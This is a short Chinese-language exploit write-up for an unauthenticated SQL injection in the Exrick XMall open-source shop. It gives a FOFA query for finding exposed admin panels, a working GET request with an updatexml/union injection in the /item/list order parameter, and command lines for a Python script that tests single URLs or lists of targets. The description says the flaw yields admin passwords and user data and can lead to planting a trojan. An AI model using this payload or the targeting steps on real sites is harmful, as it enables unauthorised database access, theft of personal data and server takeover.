# Exrick XMall 开源商城 SQL注入漏洞

### 1.漏洞描述

XMal 开源商城 itemlist./itemvistSearch,/svslog,lorderlist,/memmberlist、/meberlistremove等多处接口存在SQL注入漏洞，未经身份验证的攻击者可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

### 2.fofa语法

```
app="XMall-后台管理系统"
```

### 3.漏洞复现

```
GET /item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136 HTTP/1.1
```

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719830143304-395af136-6b1e-45b1-9ac8-884d6a1c3e38.png)

### 4.py脚本使用

```
python3 脚本文件名 -u "http://127.0.0.1"  # 测试单个url
python3 脚本文件名 -f url.txt             # 测试多个url
```

